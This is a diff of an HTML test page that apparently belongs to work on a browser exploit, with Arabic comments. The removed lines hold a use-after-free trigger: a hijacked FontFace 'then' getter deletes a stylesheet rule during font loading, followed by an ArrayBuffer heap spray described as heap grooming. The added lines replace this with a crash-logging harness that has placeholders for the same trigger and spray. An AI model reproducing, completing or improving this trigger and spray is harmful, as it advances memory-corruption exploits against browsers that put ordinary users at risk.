@@ -1,35 +1,30 @@
-<!DOCTYPE html>
-<html>
-<body>
+<body style="margin:0; padding:20px; font-family:monospace; background:black; color:white;">
+    <div id="log" style="position:fixed; top:0; left:0; width:100%; height:100%; padding:20px; overflow:auto; white-space:pre-wrap;"></div>
+
 <script>
-    // 1. مصفوفة للسيطرة على الذاكرة (Heap Grooming)
-    let spray = [];
-    
-    // 2. المحفز (Trigger)
-    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(A);
+    function log(m, color) {
+        let el = document.createElement('div');
+        el.innerHTML = "[LOG]: " + m;
+        document.getElementById('log').appendChild(el);
+        if (color) document.body.style.background = color;
+    }
 
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            // تنفيذ الثغرة
-            document.getElementById('s').sheet.deleteRule(0);
-            
-            // "هندسة الذاكرة": هنا يتم ملء الفراغ الذي تركه الكائن المحذوف
-            // نستخدم ArrayBuffer أو كائنات أخرى بحجم مشابه
-            for (let i = 0; i < 100; i++) {
-                spray.push(new ArrayBuffer(0x1000)); 
-            }
-            
-            document.body.offsetTop; // Trigger Reflow
-            return undefined;
-        }
-    });
+    // الاعتراض على أي خطأ يسبب Crash
+    window.onerror = function(msg, url, line) {
+        log("CRASH DETECTED: " + msg + " at line " + line, "#800");
+    };
 
-    document.fonts.load('1em x', 'AB');
+    log("1. بدء العمليات...", "green");
+
+    try {
+        // ... (كود الـ FontFace Trigger الخاص بك)
+        log("2. جاري تنفيذ الـ Trigger...", "yellow");
+        
+        // هنا تضع الـ Spray الخاص بك
+        log("3. جاري الـ Heap Spray...", "orange");
+
+    } catch(e) {
+        log("ERROR: " + e.message, "red");
+    }
 </script>
-<style id="s">
-    @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
-</style>
 </body>
-</html>
